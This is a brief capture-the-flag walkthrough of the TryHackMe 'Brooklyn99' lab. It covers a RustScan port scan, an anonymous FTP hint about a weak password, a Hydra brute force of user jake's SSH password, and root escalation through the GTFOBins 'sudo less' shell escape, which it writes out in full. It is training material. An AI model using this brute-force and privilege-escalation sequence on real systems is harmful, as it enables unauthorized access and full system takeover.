* * *
 ### Lab: Brooklyn99
 ### Platform: TryHackMe
* * *
![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/783caa35-2e5c-40a0-9315-5ed21cc68f68)

### Enumeration
- Rustscan's scan details

      ❯ rustscan -a 10.10.237.215 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Real hackers hack time ⌛
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.237.215:21
      Open 10.10.237.215:22
      Open 10.10.237.215:80`

- The scan result reveals that the ftp service allows anonymous login.The directory contains a txt file stating that the `user: jake` has a weak password
 ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d3907bb6-d7e0-4fcd-9c5a-3b3d01bbde3a)

- I bruteforced jake's password with Hydra

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d4ff07d4-0007-4313-9ed6-125e90d6de05)

- Ssh access

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/8f50a8e4-8f82-4ac3-a493-87969336ba15)

### Privesc

- We can run the binary `/usr/bin/less` as root without password.We can use this binary to escalate privileges to root

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3950a583-58a1-4d5d-a260-cecf43e35751)

- I got this payload from gtfobins

      sudo less /etc/profile
      !/bin/sh

- Root access

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/63b0630e-8718-43a0-a46e-5fa865d2002f)
